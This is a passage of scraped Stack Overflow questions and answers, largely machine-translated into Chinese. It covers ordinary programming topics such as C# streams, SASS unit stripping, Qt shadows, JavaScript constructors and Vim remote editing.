    var imports = new List<Tuple<string, string>>();
    foreach (var import in part.ImportDefinitions)
    {
        SerializedImportDefinition importDefinition = !ReflectionModelServices.IsImportingParameter(import)
            ? importDefinition = CreatePropertyImport(import)
            : importDefinition = CreateConstructorParameterImport(import);
    }
}

private Tuple<string, string> CreatePropertyImport(ImportDefinition import)
{
    var memberInfo = ReflectionModelServices.GetImportingMember(import);
    if (memberInfo.MemberType != MemberTypes.Property)
    {
        throw new ArgumentOutOfRangeException("import");
    }

    // this is a bit ugly because we assume that the underlying methods for a property are named as:
    // get_PROPERTYNAME and set_PROPERTYNAME. In this case we assume that imports always
    // have a set method.
    var getMember = memberInfo.GetAccessors().Where(m => m.Name.Contains("set_")).First();
    var name = getMember.Name.Substring("set_".Length);
    var property = getMember.DeclaringType.GetProperty(name);
    return new Tuple<string, string>(import.ContractName, property.ToString());
}

private Tuple<string, string> CreateConstructorParameterImport(ImportDefinition import)
{
    var parameterInfo = ReflectionModelServices.GetImportingParameter(import);
    return new Tuple<string, string>(import.ContractName, parameterInfo.Value.ToString());
} 
```

请注意，似乎无法通过方法参数提供导入，因此上面的代码不支持这些。

[处理完所有导出和导入后，将存储的MemberInfo](http://msdn.microsoft.com/en-us/library/system.reflection.memberinfo.aspx)对象序列化为字符串格式就是一个简单的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-09-21T20:32:47.457

我有同样的要求，最终实现了与@Petrik 在他的回答中提到的非常相似的东西。我的[LazyAssemblyLoading 解决方案](https://github.com/lestera/LazyAssemblyLoading)可在 GitHub 上找到。

# c# - MemoryStream 有一个线程写入，另一个读取

> ID：12328245
> 
> 赞同：19
> 
> 时间：2012-09-08T05:20:58.343
> 
> 标签：c#, multithreading, stream, memorystream

这就是我写入流然后使用 1 个线程从中读取的方式：

```
 System.IO.MemoryStream ms = new System.IO.MemoryStream();

        // write to it
        ms.Write(new byte[] { 1, 2, 3, 4, 5, 6, 7 }, 0, 7);

        // go to the begining
        ms.Seek(0, System.IO.SeekOrigin.Begin);

        // now read from it
        byte[] myBuffer = new byte[7];
        ms.Read(myBuffer, 0, 7); 
```

**现在我想知道是否可以从一个线程写入内存流并从单独的线程读取该流。**

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-09-08T05:34:34.753

由于 Stream 状态已满，因此您不能同时使用具有从 2 个线程中搜索功能的 Stream。例如，一个 NetworkStream 有 2 个通道，一个用于读取，一个用于写入，因此不支持查找。

如果你需要寻求能力，你需要创建2个流，一个用于读取，一个用于写入。否则，您可以简单地创建一个新的 Stream 类型，该类型允许通过对底层流进行独占访问并恢复其写入/读取位置来从底层内存流中读取和写入。一个原始的例子是：

```
class ProducerConsumerStream : Stream
{
    private readonly MemoryStream innerStream;
    private long readPosition;
    private long writePosition;

    public ProducerConsumerStream()
    {
        innerStream = new MemoryStream();
    }

    public override bool CanRead { get { return true;  } }

    public override bool CanSeek { get { return false; } }

    public override bool CanWrite { get { return true; } }

    public override void Flush()
    {
        lock (innerStream)
        {
            innerStream.Flush();
        }
    }

    public override long Length
    {
        get 
        {
            lock (innerStream)
            {
                return innerStream.Length;
            }
        }
    }

    public override long Position
    {
        get { throw new NotSupportedException(); }
        set { throw new NotSupportedException(); }
    }

    public override int Read(byte[] buffer, int offset, int count)
    {
        lock (innerStream)
        {
            innerStream.Position = readPosition;
            int red = innerStream.Read(buffer, offset, count);
            readPosition = innerStream.Position;

            return red;
        }
    }

    public override long Seek(long offset, SeekOrigin origin)
    {
        throw new NotSupportedException();
    }

    public override void SetLength(long value)
    {
        throw new NotImplementedException();
    }

    public override void Write(byte[] buffer, int offset, int count)
    {
        lock (innerStream)
        {
            innerStream.Position = writePosition;
            innerStream.Write(buffer, offset, count);
            writePosition = innerStream.Position;
        }
    }
} 
```

# django - Django Tastypie creating models several relations deep

> ID：12328247
> 
> 赞同：1
> 
> 时间：2012-09-08T05:21:19.800
> 
> 标签：django, api, orm, tastypie

I'm trying to use Django Tastypie to allow an implementor to POST/PUT data to create models that are related several levels deep. So POST something like this (as JSON) to create let's call it a Blob, which has many Foos, each of which has many Bars (both models as well):

```
{"foos":[
    {"bars":[
        {"baz":"boo"}
    ]}
]} 
```

The model relations are all set in my models.py and resources.py scripts so that Blobs have many Foos and Foos have many Bars. The problem is that in doing this, Tastypie seems to only go a single level deep with obj_create doing the related fields, so the Bars never get created, and it kicks back an error if that field is required or nothing gets stored if it isn't. How do I go about getting Tastypie to traverse down through the levels?

As a side note, I know I could use the separate Bar endpoint to create those first, and then pass in the resource URIs with the given Foo. But for arguments sake let's say that's not possible, I need to take the entire data representing a Blob as a single POST.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T10:50:14.127

我猜 Tastypie 不支持开箱即用的这种关系。这可能是因为您通常不需要如此深的嵌套。

您可以将它们放在模型中，但是如果您想以这种方式公开它，那么拥有一个平坦的资源怎么样。鉴于您可以使用相关模型的属性，例如`some_field = fields.CharField( attribute = 'relatedmodel__field' )`我认为会被保存的那些。

这样你的 API 会更好，你仍然可以得到你需要的东西。

# c++ - How would I draw a shadow under a widget in Qt?

> ID：12328251
> 
> 赞同：7
> 
> 时间：2012-09-08T05:22:18.533
> 
> 标签：c++, qt, user-interface, widget, shadow

I am wondering how I would draw a shadow under a widget (which isn't the main widget, say, a label.) in Qt. Would I neeed use a stylesheet or would I code it (in C++)?

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2014-10-11T15:59:34.950

假设你有一个表格和一个标签，你想从中投下阴影。

您可以像这样使用[QGraphicsDropShadowEffect](http://qt-project.org/doc/qt-5/qgraphicsdropshadoweffect.html)：

```
QGraphicsDropShadowEffect *effect = new QGraphicsDropShadowEffect;
effect->setBlurRadius(5);
effect->setXOffset(5);
effect->setYOffset(5);
effect->setColor(Qt::black);

label->setGraphicsEffect(effect); 
```

效果是：

![在此处输入图像描述](../Images/d72f4a303ba819ce6d3d75037751ce68.png)

这种效果的缺点是，如果你将它应用到一个小部件上，它的所有子级都会继承它。如果您将效果应用于具有大量小部件的小部件，这可能会出现问题，因为它可能会减慢渲染时间。但是对于您的示例，这非常好并且推荐。

有关效果的更多信息，`Qt`请查看同样派生自的[QGraphicsEffect](http://qt-project.org/doc/qt-4.8/qgraphicseffect.html)类。`QGraphicsDropShadowEffect`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T08:54:48.783

QLabel 继承自[QFrame](http://doc-snapshot.qt-project.org/4.8/qframe.html#Shadow-enum)。您可以使用它来创建阴影。

# c++ - Where could you download the static library/header for the standard math library for c?

> ID：12328253
> 
> 赞同：0
> 
> 时间：2012-09-08T05:22:56.010
> 
> 标签：c++, c, static-libraries

I have googled and looked all over, but can't find it ANYWHERE. Anyone know where to get it?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T08:30:42.010

好的。在对此文档进行了一些研究之后，我相信您正在寻找的库是 WinAVR-GCC 工具包、CEENBoT-API 的静态库工具包以及其他一些东西的一部分。根据UnOmaha上的[链接，您需要对这些小宝石进行编程。](http://www.ceen.unomaha.edu/CEENBoT/API/CEENBoT-API_GettingStarted%28Rev1.07%29.pdf)但我相信您正在寻找的配置位于链接 PDF 的第 11 页。配置项目有一个相当不错的演练。

这些机器人使用交叉编译器进行有效编程，配置它们始终是一个有趣的议程。祝你好运。（现在你让我想出去买一个，只要我和我妻子清理干净，因为这些东西看起来很酷）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T06:35:57.090

数学库是 C 标准库的一部分。它应该与编译器一起提供。

# function - How do you strip the unit from any number in SASS?

> ID：12328259
> 
> 赞同：45
> 
> 时间：2012-09-08T05:23:48.800
> 
> 标签：function, sass, units-of-measurement

I know you can strip units from numbers in SASS when you know the unit before-hand like this:

```
$number: 16px;
$without-unit: 16px / 1px;
@warn $without-unit; // 16 
```

But is it possible to strip the unit from a number without knowing what the unit is first?

```
@function strip-unit($number) {
  // magic code here...
}

@warn strip-unit(16px); // 16 
```

* * *

## 回答 #1

> 赞同：117
> 
> 时间：2012-09-09T01:27:54.380

--

**更新：**您实际上永远不需要使用此功能。Sass 数学在单位方面非常聪明，我从未见过这样的用例，其中剥离单位比简单地使用正确的数学来获得你需要的东西更好。请参阅[Sass 问题线程](https://github.com/sass/sass/issues/533)，其中已对此进行了详细讨论。

这是一个聪明的功能，但如果你想使用它，你的数学可能有问题。不要依赖此功能。改正你的数学。

--

您需要除以同一单位的 1。如果你使用`unit()`，你会得到一个字符串而不是一个数字，但是如果你乘以零并加 1，你就会得到你需要的东西：

```
@function strip-units($number) {
  @return $number / ($number * 0 + 1);
} 
```

**更新**：在最新版本的 Sass 中，变为：

```
@use 'sass:math';

@function strip-units($number) {
  @return math.div($number, ($number * 0 + 1));
} 
```

这样可行。`strip-units(13.48cm)`将返回`13.48`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T22:12:52.943

我认为您必须添加一个自定义 Ruby 函数来剥离单元（请参阅有关[添加自定义函数](http://sass-lang.com/docs/yardoc/Sass/Script/Functions.html#adding_custom_functions)的文档）。我认为它看起来像这样（警告，未经测试）：

```
module Sass::Script::Functions
  def strip_units(num)
    assert_type num, :Number
    Sass::Script::Number.new(num.value)
  end
end 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-02-12T11:27:18.983

带单元 SASS 函数的唯一用例是编写单位转换函数时。我只发现它对于将 PX 转换为 EM/REM 的任务很有用，反之亦然。

> 您需要除以同一单位的 1。如果你使用 unit()，你会得到一个字符串而不是一个数字，但是如果你乘以零并加 1，你就会得到你需要的东西 - Miriam Suzanne

我相信 SASS 编译器对值的处理与 PHP 解释器的处理非常相似（尽管有警告），所以我认为上面的陈述是不正确的。如果您将字符串（以数字开头，例如`'16px'`）与数字值（或以数字开头的字符串值）相除或相乘，则字符串将转换为数字，以便编译器能够执行操作。

将字符串添加到数字也是如此，它将数字转换为字符串。

以下解决方案正确应用了此策略：

```
@function strip-unit($value) {
  @return $value / 1;
} 
```

# objective-c - 使用 leftChild 和 rightChild 实现二叉树是不好的做法吗？

> ID：12328261
> 
> 赞同：0
> 
> 时间：2012-09-08T05:24:01.157
> 
> 标签：objective-c, ios

我已经很久没有实现二进制了，最近有一个要求（为了演示一些代码），我开始使用：

```
@interface NSNode : NSObject

@property (strong, nonatomic) NSNode *leftChild;
@property (strong, nonatomic) NSNode *rightChild; 
```

但后来，似乎每当我需要对两个节点做某事时，我都需要写两次——一次给左孩子，一次给右孩子，除非我把需要做的事情变成一个额外的方法, 并仔细传递正确的参数——为了实现这一点，会有很多额外的方法。

如果它是通过使用 NSMutableArray 完成的

```
typedef enum {
    NSNodeLeft = 0,
    NSNodeRight
} NSNodeLeftOrRightSide;

@interface NSNode : NSObject

@property (strong, nonatomic) NSMutableArray *children; 
```

然后我总是可以使用循环对两个节点做一些事情：

```
for (NSNode *node in self.children) {
    // do something
} 
```

或者如果需要一个索引来判断它是左孩子还是右孩子：

```
[self.children enumerateObjectsUsingBlock:
    ^(NSNode *node, NSUInteger nodeIndex, BOOL *stop) {
        // do something
    }
]; 
```

并且`nodeIndex`可以用来确定它是左孩子还是右孩子。

更重要的是，这个类可以很容易地扩展到具有 N 个孩子的树。这实际上是一个更好的做法吗？除了使用数组的性能非常小之外，还有什么缺点吗？（我之所以选择`NSMutableArray`不是，是`NSArray`因为如果我们需要制作这个 N-children，我们不需要将其更改为`NSMutableArray`所有地方）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-08T05:58:28.537

当您需要对两个孩子做某事时，您总是可以使用数组

```
for (Node *node in @[self.leftChild, self.rightChild]) {
    // ...
} 
```

如果你想让它更简单，你可以定义一个`- (NSArray *)children`返回的方法`@[self.leftChild, self.rightChild]`。但是将可变属性保留为不同的子节点很有用，因为它明确编码了您的节点只有 2 个子节点而不是无限数量的子节点这一事实。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-08T05:58:19.543

首先，您不应该**使用**名称`NSNode`。Apple 保留`NS`前缀供自己使用。

其次，只给你的`Node`班级自己的枚举信息。

```
@interface Node : NSObject

- (void)enumerateChildrenUsingBlock:(void (^)(Node *child, NSUInteger childIndex, BOOL *stop))block;

// I prefer this shorter name style in my own classes:
- (void)forEachChild:(void (^)(Node *child, NSUInteger childIndex, BOOL *stop))block; 
```

实现它很简单：

```
@implementation Node

- (void)enumerateChildrenUsingBlock:(void (^)(Node *child, NSUInteger childIndex, BOOL *stop))block {
    BOOL stop = NO;
    block(self.leftChild, 0, &stop);
    if (!stop) {
        block(self.rightChild, 1, &stop);
    }
} 
```

如果你实现了`NSFastEnumeration`协议，你也可以像这样编写一个 for/in 循环：

```
for (Node *child in parentNode) {
    // do something with child
} 
```

你可以`NSFastEnumeration`这样实现：

```
@interface Node : NSObject <NSFastEnumeration>
...

@implementation Node

- (NSUInteger)countByEnumeratingWithState:(NSFastEnumerationState *)state objects:(id *)stackbuf count:(NSUInteger)stackbufCount {
    // The compiler initializes state->state to 0 at the start of the for...in loop.
    // I use it to track which children have been returned.
    // 0 = no children returned yet
    // 1 = left children returned
    // 2 = both children returned

    state->itemsPtr = stackbuf;
    state->mutationsPtr = (__bridge unsigned long *)self;

    NSUInteger count = 0; // number of children I'm returning on this call
    if (state->state < 1 && count < stackbufCount) {
        stackbuf[count++] = self.leftChild;
        ++state->state;
    }
    if (state->state < 2 && count < stackbufCount) {
        stackbuf[count++] = self.rightChild;
        ++state->state;
    }

    return count;
} 
```

看看这篇文章了解更多关于快速枚举的信息：http: [//www.mikeash.com/pyblog/friday-qa-2010-04-16-implementing-fast-enumeration.html](http://www.mikeash.com/pyblog/friday-qa-2010-04-16-implementing-fast-enumeration.html)

# php - 将布尔返回值保存到变量中？

> ID：12328263
> 
> 赞同：0
> 
> 时间：2012-09-08T05:24:56.740
> 
> 标签：php

有没有办法将函数中的布尔真/假值保存到变量中？

```
function check() {
    if(1 = 1) {
        return false;
    }
}
$status = check();
if($status === false) {
    echo "sign in please";
} 
```

到目前为止，`$status`它是空的。我不喜欢使用，`if(check() === false) {}`因为我的很多函数都有很多参数。并且`$status`在函数内设置会破坏可用于多个变量的通用函数的目的。

你们怎么处理这个？

编辑：我很抱歉，我的代码中的其他内容导致它为空。试图做一个测试（上面的代码），当它失败时，我认为这是一个有价值的问题：P

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T05:26:14.273

单个等号是赋值，而不是比较。您可以使用三等号修复它（比较两个值是否完全相同）。

```
function check() {
    if(1 === 1) { // Here
        return false;
    }
}
$status = check();
if($status === false) {
    echo "sign in please";
} 
```

# firefox-addon - 将文本框动态更改为多行

> ID：12328264
> 
> 赞同：0
> 
> 时间：2012-09-08T05:24:58.690
> 
> 标签：firefox-addon, xul

我正在开发一个 Firefox 扩展。我有一个简单的单行文本框。当用户粘贴文本时，我想检测文本是否有换行符，如果有，我想将文本框扩展为多行文本框。

我有

```
<textbox id="textbox" rows="5" wrap="off" newlines="pasteintact" oninput="adjustTextbox(this)" flex="1"/> 
```

在 JS 方面，我有

```
adjustTextbox(txtBox) {
  if(!txtBox.getAttribute('multiline') && txtBox.value.match(/[\r\n]/)) {
    txtBox.setAttribute('multiline', true);
  }
} 
```

问题是，虽然文本框确实转换为 5 行多行文本框，但粘贴的值丢失并且文本框为空白。我在这里做错了吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T08:19:53.797

简短回答：不，您没有做错任何事情，当您从单行切换到多行时，该值预计会被清除。长答案：`<textbox>`元素实际上并不保存值本身，而是包含一个匿名的`<html:input type="text>`。当您添加该`multiline`属性时，一个不同的 XBL 绑定将应用于该元素，并且该匿名文本字段被替换为`<html:textarea>`. 显然，价值会在这个过程中丢失。

您可以尝试保存该值并在添加`multiline`属性后恢复它。问题是很难判断绑定何时实际应用，存在无法真正预测的延迟。因此，更好的解决方案是在文档中同时包含单行和多行文本框，并确保其中一个始终折叠：

```
<textbox id="textbox" newlines="pasteintact" oninput="adjustTextbox(this)" flex="1"/>
<textbox id="textbox2" collapsed="true" multiline="true" rows="5" wrap="off" flex="1"/> 
```

在 JavaScript 方面：

```
function adjustTextbox(txtBox) {
  if(!txtBox.getAttribute('multiline') && txtBox.value.match(/[\r\n]/)) {
    var txtBox2 = document.getElementById("textbox2");
    txtBox2.value = txtBox.value;
    txtBox.collapsed = true;
    txtBox2.collapsed = false;
  }
} 
```

# windows-phone-7 - 我想使用silverlight在windows7的页面导航中将列表作为参数传递并在目标页面中访问它们

> ID：12328265
> 
> 赞同：-2
> 
> 时间：2012-09-08T05:24:58.440
> 
> 标签：windows-phone-7

我是 Windows Phone 7 开发的新手。

在我的第一个应用程序中，我想在不同的页面中创建两个带有复选框的列表框，并用一些数据填充第一个列表框。当我在第一个列表框中选择一些记录时，必须将特定记录添加到另一个列表框中。`listbox.ItemSource`当我尝试将该列表分配给它时，我完成了列表框选择并通过参数将选定项传递给另一个页面`ArgumentNullException`。

请帮我解决这个问题。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T06:57:27.440

首先，正如您所指出的，正在抛出 ArgumentNullException。因此，基本上，当您对 ItemsSource 进行分配时，您提供的是空值。换句话说，您认为您从对象页面收到的对象为空。

其次，如果您不提供任何源代码，则很难帮助您调试问题。但是，一般来说，当您位于列表框被填充的第二页时，您是否能够使用虚拟数据和代码隐藏（即不是来自 XAML）进行测试？所以，暂时忽略数据的传递。只需确保在加载第二个页面时，列表框会填充您在该页面的代码隐藏中创建的虚拟数据。如果可行，那么您的问题就更简单了。

希望这会有所帮助。

//-- 添加示例代码-- //

*第一页.xaml*

```
<ListBox x:Name="FirstListBox" Grid.Row="1" ItemsSource="{Binding}" SelectionChanged="HandleSelection">
    <ListBox.ItemTemplate>
        <DataTemplate>
            <TextBlock Text="{Binding}" FontSize="32" Margin="12"/>
        </DataTemplate>
    </ListBox.ItemTemplate>
</ListBox> 
```

*第一页.xaml.cs*

```
FirstListBox.DataContext = new String[] { "A", "B", "C", "D", "E", "F", "G", "H", "I", "J" }; 
```

**...**

```
private void HandleSelection(object sender, SelectionChangedEventArgs e)
{
    String selection = (String)FirstListBox.SelectedItem;
    NavigationService.Navigate(new Uri("/Secondpage.xaml?id=" + selection, UriKind.Relative));
} 
```

*第二页.xaml*

```
<ListBox x:Name="OtherListBox" Grid.Row="1" ItemsSource="{Binding}">
    <ListBox.ItemTemplate>
        <DataTemplate>
            <TextBlock Text="{Binding}" FontSize="32" Margin="12"/>
        </DataTemplate>
    </ListBox.ItemTemplate>
</ListBox> 
```

*第二页.xaml.cs*

```
protected override void OnNavigatedTo(NavigationEventArgs e)
{
    String id = null;
    NavigationContext.QueryString.TryGetValue("id", out id);
    if (id != null)
    {
        List<String> dummyData = new List<string>();
        for (int i = 0; i < 12; i++)
        {
            dummyData.Add(id + " - " + i);
        }
        OtherListBox.DataContext = dummyData;
    }
} 
```

因此，正如您可以从我在 Firstpage 中有一个虚拟列表中读取的那样，当我单击任何项​​目时，它会将我带到另一个页面，其中还有另一个列表，其中填充了从我的初始选择中生成的数据。如您所见，我将选择作为查询字符串参数传递，就像我在对此答案的评论中所解释的那样。

希望这可以解决您的问题，我期待您接受此解决方案作为您问题的答案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-10T05:07:03.083

```
public partial class MainPage : PhoneApplicationPage

    void MainPage_Loaded(object sender, RoutedEventArgs e)
    {

        //adding data to listbox on page load event//
        for (int i = 0; i < 20; i++)
        {
            id = i + 1;
            name = "productname" + i;
            quantity = i + 2 / 2;
            productlist.Add(new ProductList(id, name, quantity));
        }
        lstpro.ItemsSource = productlist;

    }
    private void button1_Click(object sender, RoutedEventArgs e)
    {
          //using   PhoneApplicationService.Current.State to store the list//
          PhoneApplicationService.Current.State["yourparam"] = lstpro.SelectedItems;

          NavigationService.Navigate(new Uri("/res.xaml", UriKind.Relative))
    }

} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-10T05:15:09.440

而在第二页...

<`私有IList iList1;

```
 //In The onNavigatedTo Event assign the stored list to the variable//      
 protected override void OnNavigatedTo(System.Windows.Navigation.NavigationEventArgs e)
    {

         var i= PhoneApplicationService.Current.State["yourparam"];
         iList1 = (IList) i ;//convert object to list//
         lstpro.ItemsSource = iList1;

    }' 
```

# javascript - 在 JavaScript 中不使用 new 的全局命名空间填充

> ID：12328267
> 
> 赞同：1
> 
> 时间：2012-09-08T05:25:41.157
> 
> 标签：javascript

我正在观看有关 javascript 的 Douglas crockford 视频，他提到的一件事是，如果您忘记将**new**用于类，那么它将填充浏览器中的全局命名空间是 window。我想更好地理解这一点，所以我去测试了如下

```
var User = function(first,last){
  this.name = first + " " + last;
}

var user = new User("John","Resig");
alert(window.name); // expected to see undefined, but was John Resig
alert(user.name); // this should only show John Resig correctly

var user1 = User("Douglas","Crockford");
alert(window.name); // expected to see Douglas Crockford and shown correctly 
```

现在有两种可能，要么我对全局命名空间的理解是错误的，要么我的例子是错误的。感谢您是否可以让我朝着正确的方向前进。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T05:51:26.973

原因`this`在`User`函数中是指`window`if`new`没有使用。函数的默认值`this`（在传统 JavaScript[1] 中）是`window`.

[1] 支持的浏览器`'use strict'`在严格模式下不会这样。相反，它们会抛出异常，因为`this`is `undefined`if `new`, `apply`, `call`,`bind`等没有被使用。见[http://jsfiddle.net/ufTq9/](http://jsfiddle.net/ufTq9/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T06:01:46.063

您可以尝试这样的技巧：

```
var User = function(first,last){
   if(this == window)
       return new User(first, last);

   this.name = first + " " + last;
}
var normalUser = new User('first', 'last');
var globalUser = User('fname', 'lname');
// it is undefined :D
alert(typeof window.fname); 
```

问题是您`new`通过检查范围（`this`关键字）来检查构造中是否使用了关键字，如果不是（`this == window`），您可以强制`new`返回一个对象。

# codeigniter - Codeigniter 评论回复系统

> ID：12328271
> 
> 赞同：1
> 
> 时间：2012-09-08T05:26:46.630
> 
> 标签：codeigniter

我是 CI 新手。

现在我正在尝试开发带有回复选项的评论系统。

到目前为止，我已经开发了插入评论和回复评论。

但我不知道如何在主要评论下获取回复评论。

请帮我。

谢谢大家

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T06:25:33.180

使用递归函数！为此，您需要执行以下操作：

1.  获取第一条评论。
2.  调用递归函数。评论的 ID 必须作为参数传递。
3.  该函数必须获取评论并调用自身才能获取所有评论。

此模式的伪代码将是：

```
myComment = getComment();
recursiveComments(myComment);

function recursiveComments(currentComment){
  print(currentComment);
  replies = getReplies(currentComment['idComment']);
  foreach(replies as reply){
     recursiveComments(reply);
  }
} 
```

在伪代码中，我假设您使用 getComment() 函数获得了一个 row_array，并且该评论是所有评论的“头部”，就像最初的帖子一样。之后，我调用递归函数来获取每个评论的所有回复和子回复。请注意，我在每次调用该函数时都会获取一个回复。

希望这能给你一个想法！(=

# c++ - 删除数组中的重复项 (C++)

> ID：12328275
> 
> 赞同：1
> 
> 时间：2012-09-08T05:27:01.387
> 
> 标签：c++, arrays, duplicates

我在这里看到一篇较旧的帖子，询问如何做相对相同的事情，但他们的方法不同，我很想知道我的程序中的漏洞。

我正在尝试编写一个程序，将字符接收到 10 个字符长度的数组中。我希望程序评估第一个数组位置并删除它稍后在数组中找到的任何重复项，方法是识别重复项并将其右侧的所有值向左移动一个。然后数组的“大小”减一。

我相信我用于删除函数的逻辑是正确的，但程序只为数组中的第一个值和第四个值打印一个“a”。

任何帮助将不胜感激，这是我的代码：

```
#include <iostream>
using namespace std;

int letter_entry_print(int size, char array[10]);
int delete_repeats(int& size, char array[10]);
int final_array_print(int size, char array[10]);

int main()
{
    char array[10];
    int size = 10;

    letter_entry_print(size,array);
    delete_repeats(size,array);
    final_array_print(size,array);

    cout<<"\n";
    system("pause");
}

int letter_entry_print(int size, char array[10])
{
    int i;

    for (i=0;i<size;i++)
    {
        cout << "Enter letter #" << i+1 << endl;
        cin >> array[i];
        cout << "\n";
    }

    cout << "\nYour array index is as follows:\n\n";

    for (i=0;i<size;i++)
    {
        cout << array[i];
        cout << " ";
    }

    cout <<"\n\n";
    return 0;
}

int delete_repeats(int& size, char array[10])
{
    int ans;
    int loc;
    int search;
    int replace;
    char target='a';

    cout << "Enter 1 to delete repeats.\n\n";
    cin >> ans;
    if(ans==1)
    {
        for(loc=0;loc<size;loc++)
        {
            array[loc]=target;
            for(search=1;search<(size-loc);search++)
            {
                if(target=array[loc+search])
                {
                    for(replace=0;replace<(size-(loc+search));replace++)
                    {
                        array[loc+search+replace]=array[loc+search+replace+1];
                        array[size-1]=0;
                        size=(size-1);
                    }
                }
            }
        }
    }else(cout<<"\nWhy didn't you press 1?\n\n");
    return 0;
}

int final_array_print(int size, char array[10])
{
    cout<<"\nYour new index is as follows:\n\n";
    int i;
    for(i=0;i<size;i++)
    {
        cout<<array[i];
        cout<<" ";
    }

    cout<<"\n";
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T05:54:19.803

好的，您的代码有些地方看起来很奇怪。

1）你在整个地方重复 10 到你无法合理改变它的地步，但你也会传递大小。与其让所有函数都采用 10 个字符的数组，不如考虑只传递一个指向 char 的指针，例如：

```
int final_array_print(int size, char *array) 
```

那么您可以更轻松地更改数组的大小。如果您要将自己永远限制为 10 个项目，那么到处传递大小是没有意义的，如果您提供一个大小，就没有充分的理由传递 10 个项目的数组！

2) 好的，所以现在您要查找重复项。为什么用'a'覆盖数组中的第一个元素？

```
 char target='a';
...
array[loc]=target; 
```

你不想反过来做吗？

3）接下来，正如@Mahesh 指出的那样，您可能希望在查找重复项时使用比较运算符'=='而不是赋值运算符=：

```
if(target=array[loc+search]) 
```

应该是

```
if(target == array[loc+search]) 
```

4) 接下来，不要害怕在你的单词和标点符号之间使用很小的空格。这样更容易识别打字错误和拼写错误。

5）您实际执行替换的循环具有非常复杂的索引。如果您不从 replace = 0 开始，而是从 replace = search + 1 开始，尝试一下，也许您会发现所有其余索引都变得简单得多。

# vim - Vim --remote-silent 总是为第一个文件打开 [No Name] 缓冲区

> ID：12328277
> 
> 赞同：6
> 
> 时间：2012-09-08T05:27:33.667
> 
> 标签：vim

我希望能够使用相同的实例打开文件，所以我`--remote-silent`在打开文件时添加了。但是第一次加载时，Vim 会打开一个空缓冲区，然后是我的文件。所以现在我有 2 个缓冲区。

经过进一步调查，我注意到设置`nohidden`将解决此问题。但是，这不仅不符合我的喜好，还会导致第一个缓冲区没有语法高亮显示。

`--remote-silent`如果没有选项，这不会发生。

任何帮助表示赞赏。谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-08T06:59:53.997

在`$ vim --servername FOO --remote[-silent] filename`没有正在运行的实例的情况下首先启动一个新实例，*然后*打开文件：它不像`$vim filename`. 您必须找到一种方法来完全删除第一个空缓冲区。

从我有限的测试中，添加`set bufhidden=wipe`到您`~/.vimrc`可能会解决问题。

`set bufhidden=wipe`，作为缓冲区的本地，仅应用于第一个空缓冲区并在之后重置。

见`:h bufhidden`。

但是，当您正常运行 Vim 时，这肯定会导致一些问题。

***编辑***

是的，`set bufhidden=wipe`会导致明显的问题。当“正常”启动时（使用`$vim file1`），当您编辑不是您想要的第二个文件时，第一个缓冲区会被擦除。

对缓冲区名称的简单检查可以解决该问题：

```
if bufname('%') == ''
  set bufhidden=wipe
endif 
```

语法高亮适用于任何情况，在这里。你能把你`~/.vim/`和`~/.vimrc`某处的内容贴出来吗？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2019-01-03T18:59:17.767

选项系列允许在`--remote`打开文件后执行额外的 Ex 命令。

您可以在这里做的是添加`:bd1`删除缓冲区 #1，即 [No Name] 缓冲区。

例子：`--remote-silent +:bd1 {file}`

# php - 发送数据时如何重定向到回调

> ID：12328279
> 
> 赞同：0
> 
> 时间：2012-09-08T05:27:52.043
> 
> 标签：php, oauth, http-post

我正在编写自己的“Oauth 服务提供商‘系统’”，我刚刚注意到我必须将用户重定向到回调 url，但我还必须向该 URL 发送一些数据。

所以我对我应该做什么有点困惑。也许将用户重定向到`http://callback.com/oauth.php?name=value&param=value`一个`_GET`请求但是如果我想发送一个`POST`请求并且不想使用 cURL 怎么办？

总而言之，我是否可以通过`$_GET`在回调中发送参数，并且在这种情况下是否可以在没有 cURL 的情况下发送 POST 数据？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T05:45:54.077

我认为，根据第 3.1.2.1 - 3.1.2.2 [https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-23#section-3.1.2](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-23#section-3.1.2)部分 ，重定向需要是 GET .

# c# - 解释在 ASP.NET C# 代码中捕获的 Jquery 和 Javascript 事件的书籍/链接

> ID：12328290
> 
> 赞同：2
> 
> 时间：2012-09-08T05:30:09.760
> 
> 标签：c#, javascript, jquery, asp.net

Jquery / Javascript / AJAX 现在看起来越来越流行了。我想更好地了解如何在 C# 中使用此功能。

**是否有任何链接或书籍可以指向我从 Web C# 的角度教授 javascript？** 不仅仅是简单的语句，例如： div.Attributes.Add("onclick", "return confirm_delete();");

更像是 javascript 事件 A（可以是任何类型的事件）被触发。C# 事件处理程序捕获事件 A - 然后执行后面的代码。我是否使用委托、WebHandler、WebMethod、IHttpHandler？

我知道 ASP.NET C# 和 Javascript 是两个非常不同的东西，但我不能忽略所有可用的好的 jquery 东西，我想在我的 c# 代码中使用它们。我只是想更好地理解基础知识，这样我就可以编写 javascript 并且不需要开始提出紧急/简单的问题。

顺便提一句。我正在使用VS2008。VS2012会更好地集成javascript吗？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
